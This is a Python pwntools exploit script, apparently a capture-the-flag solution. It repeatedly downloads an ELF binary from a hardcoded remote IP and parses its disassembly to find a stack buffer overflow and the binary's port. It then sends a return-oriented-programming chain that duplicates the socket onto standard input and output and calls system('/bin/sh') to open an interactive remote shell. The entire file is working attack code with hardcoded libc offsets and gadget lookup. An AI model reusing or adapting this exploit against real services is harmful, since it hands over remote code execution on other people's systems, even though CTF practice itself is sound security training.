#!/usr/bin/env python
from pwn import *
from pwnlib.constants import *
 
LOCAL = False
#LOCAL = True
 
GDB = False
#GDB = True
 
context(arch = 'amd64', os = 'linux')
 
###############################################################################
#### 1. connect to service
#### 2. retrieve elf
#### 3. parse elf some what and get port number + check for buffer overflow
#### 4. if no buffer overflow, goto 1
###############################################################################
 
ip = "54.86.195.190"
 
# loop until we get an exploitable program
while True:
 
  # connect, receive, save and chmod the program
 
  r = remote(ip, 8888)
  data = r.recvn(8955)
  r.close()
  write("prog",data)
  os.chmod("prog",0755)
 
  # use objdump to extract info of the program
  # this could probably be done in pwntools itself
 
  r = process(["objdump","-Mintel","-D","./prog"])
  data = r.recvuntil("Disassembly of section .comment:")
  data = data.split("\n")
  r.kill()
 
  main = 0
  call_htons = 0
  call_read = 0
  call_write = 0
  allocate_on_stack = 0
  ret = 0
 
  for i in xrange(len(data)):
    if "<main>" in data[i]:
      main = i
    if "sub" in data[i] and main != 0 and allocate_on_stack == 0:
      allocate_on_stack = i
    if "<read@plt>" in data[i] and main != 0 and call_read == 0:
      call_read = i
    if "<write@plt>" in data[i] and main != 0 and call_write == 0:
      call_write = i
    if "ret" in data[i] and main != 0 and ret == 0:
      ret = i
    if "<htons@plt>" in data[i] and main != 0:
      call_htons = i
 
  port = int(data[call_htons-1].split(",")[1],16)
 
  log.info("Got port %d"%port)
 
  main = int(data[main+1].split(":")[0].lstrip(),16)
  log.info("Main at 0x%x",main)
  allocated_bytes = 0
  try:
    allocated_bytes = int(data[allocate_on_stack].split(",")[1],16)
  except:
    log.info("Couldn't find allocated bytes, trying again..")
    continue
  log.info("Found allocation of %d bytes on stack",allocated_bytes)
  read_bytes = int(data[call_read-4].split(",")[1],16)
  log.info("Found read bytes %d",read_bytes)
  ret = data[ret].split(":")[0].lstrip()
  log.info("Main ret at 0x%s"%ret)
  call_read = int(data[call_read].split(":")[0].lstrip(),16)
  log.info("Call read at 0x%x"%call_read)
  call_write = int(data[call_write].split(":")[0].lstrip(),16)
  log.info("Call write at 0x%x"%call_write)
 
  if read_bytes < allocated_bytes:
    log.info("read bytes < allocated: No overflow possible, trying again..")
    r.kill()
  else:
    break
 
###############################################################################
#### we got an elf with a buffer overflow in it
#### now connect to the port we found
###############################################################################
 
if LOCAL:
  proc = process(["./prog"])
  r = remote("localhost",port)
  if GDB:
    # attach GDB with no break points
    '''
    gdb.attach(proc,"""
    c""")
    '''
    # alternative: break at main's ret addr
    gdb.attach(proc,"""
    b *0x%s
    c"""%ret)
else:
  r = remote(ip,port)

###############################################################################
#### Step2: rop chain to dup2 file descriptors + run system
###############################################################################

# remote addresses derived from the info leak

read = 0x7ffff7b00800
offset_read = 0x00000000000eb800
libc_base = read-offset_read

offset_system = 0x0000000000046640
offset_dup2 = 0x00000000000ebfe0
offset_str_bin_sh = 0x17ccdb

system = libc_base+offset_system
dup2 = libc_base+offset_dup2
binsh = libc_base+offset_str_bin_sh

# if testing locally, we use these addresses instead
if LOCAL:
  system = 0x7ffff7a744f0
  dup2 = 0x7ffff7b0cc60
  binsh = 0x7ffff7b94160

prog = ELF("./prog")
rop = ROP(prog)

pop_rdi = rop.rdi[0]
pop_rsi_r15 = rop.rsi_r15[0]
overflow_ret = allocated_bytes-8

payload = flat(
  cyclic(overflow_ret),

  ## duplicate file descriptor of our socket to stdin, stdout, stderr,
  ## so we can interact with the shell we are about to spawn

  # dup2(sockfd,0)
  pop_rdi,      # rdi = sockfd
  6,            # socket fd (local = 4, remote = 6)
  pop_rsi_r15,  
  0,            # rsi = 0 (stdin)
  0,            # r15, dummy data
  dup2,

  # dup2(sockfd,1)
  pop_rdi,      # rdi = sockfd
  6,            # socket fd (local = 4, remote = 6)
  pop_rsi_r15,
  1,            # rsi = 1 (stdout)
  0,            # r15, dummy data
  dup2,

  # dup2(sockfd,2)
  pop_rdi,      # rdi = sockfd
  6,            # socket fd (local = 4, remote = 6)
  pop_rsi_r15,
  2,            # rsi = 2 (stderr)
  0,            # r15, dummy data
  dup2,


  ## spawn shell

  # system("/bin/sh")
  pop_rdi,      # put pointer to /bin/sh in rdi
  binsh,
  system,       # return to system
)

r.sendline(payload)
r.interactive()